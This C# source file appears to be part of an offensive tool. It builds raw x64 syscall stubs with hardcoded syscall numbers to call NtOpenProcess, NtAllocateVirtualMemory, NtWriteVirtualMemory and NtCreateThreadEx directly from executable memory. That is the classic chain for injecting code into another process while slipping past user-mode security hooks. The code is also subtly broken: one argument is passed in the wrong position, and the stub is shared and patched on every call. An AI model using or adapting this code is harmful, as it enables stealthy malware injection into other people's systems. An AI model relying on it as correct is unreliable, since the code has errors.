using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Runtime.InteropServices;

using static KanonSys.Win32;

namespace KanonSys
{
	class Syscall {

        // X64 instructions

        static byte[] syscallStruct = {
            0x4C, 0x8B, 0xD1,               // mov r10, rcx
            0xB8, 0xFF, 0x00, 0x00, 0x00,   // mov eax, FUNC(0xFF)
            0x0F, 0x05,                     // syscall
            0xC3                            // ret
        };


        static IDictionary<string, byte> instructionTranslate = new Dictionary<string, byte>() {
            {"NtOpenProcess", 0x26},
            {"NtAllocateVirtualMemory", 0x18},
            {"NtWriteVirtualMemory", 0x3a},
            {"NtCreateThreadEx", 0xc1},
        };


        public struct Delegates {

            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate NtStatus NtOpenProcess(ref IntPtr ProcessHandle, uint AccessMask, ref OBJECT_ATTRIBUTES ObjectAttributes, ref CLIENT_ID ClientId);

            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate NtStatus NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, UInt32 ZeroBits, ref UIntPtr RegionSize, UInt32 AllocationType, UInt32 Protect);

            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate NtStatus NtWriteVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, byte[] Buffer, UInt32 NumberOfBytesToWrite, ref UInt32 NumberOfBytesWritten);

            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate NtStatus NtCreateThreadEx(ref IntPtr threadHandle, UInt32 desiredAccess, IntPtr objectAttributes, IntPtr processHandle, IntPtr startAddress, IntPtr parameter, bool inCreateSuspended, Int32 stackZeroBits, Int32 sizeOfStack, Int32 maximumStackSize, IntPtr attributeList);

        }


        public static IntPtr returnMemoryAddress(string function) {

            byte[] syscall = syscallStruct;
            syscall[4] = instructionTranslate[function];

            unsafe {
                fixed (byte* ptr = syscall) {
                    IntPtr memoryAddress = (IntPtr)ptr;
                    if (!VirtualProtect(memoryAddress, (UIntPtr)syscall.Length, (uint)AllocationProtect.PAGE_EXECUTE_READWRITE, out uint lpflOldProtect)) {
                        throw new Win32Exception();
                    }
                    return memoryAddress;
                }
            }
        }

        public static NtStatus NtOpenProcess(ref IntPtr ProcessHandle, uint AccessMask, ref OBJECT_ATTRIBUTES ObjectAttributes, ref CLIENT_ID ClientId) {

            Delegates.NtOpenProcess function = (Delegates.NtOpenProcess)Marshal.GetDelegateForFunctionPointer(returnMemoryAddress("NtOpenProcess"), typeof(Delegates.NtOpenProcess));
            return (NtStatus)function(ref ProcessHandle, AccessMask, ref ObjectAttributes, ref ClientId);

        }

        public static NtStatus NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, UInt32 ZeroBits, ref UIntPtr RegionSize, UInt32 AllocationType, UInt32 Protect) {

            Delegates.NtAllocateVirtualMemory function = (Delegates.NtAllocateVirtualMemory)Marshal.GetDelegateForFunctionPointer(returnMemoryAddress("NtAllocateVirtualMemory"), typeof(Delegates.NtAllocateVirtualMemory));
            return (NtStatus)function(ProcessHandle, ref BaseAddress, ZeroBits, ref RegionSize, AllocationType, Protect);

        }

        public static NtStatus NtWriteVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, byte[] Buffer, UInt32 NumberOfBytesToWrite, ref UInt32 NumberOfBytesWritten) {

            Delegates.NtWriteVirtualMemory function = (Delegates.NtWriteVirtualMemory)Marshal.GetDelegateForFunctionPointer(returnMemoryAddress("NtWriteVirtualMemory"), typeof(Delegates.NtWriteVirtualMemory));
            return (NtStatus)function(ProcessHandle, BaseAddress, Buffer, NumberOfBytesToWrite, ref NumberOfBytesWritten);
        
        }
        public static NtStatus NtCreateThreadEx(ref IntPtr threadHandle, UInt32 desiredAccess, IntPtr objectAttributes, IntPtr processHandle, IntPtr startAddress, IntPtr parameter, bool inCreateSuspended, Int32 stackZeroBits, Int32 sizeOfStack, Int32 maximumStackSize, IntPtr attributeList) {

            Delegates.NtCreateThreadEx function = (Delegates.NtCreateThreadEx)Marshal.GetDelegateForFunctionPointer(returnMemoryAddress("NtCreateThreadEx"), typeof(Delegates.NtCreateThreadEx));
            return (NtStatus)function(ref threadHandle, desiredAccess, objectAttributes, processHandle, startAddress, parameter, inCreateSuspended, stackZeroBits, stackZeroBits, maximumStackSize, attributeList);

        }

    }
}
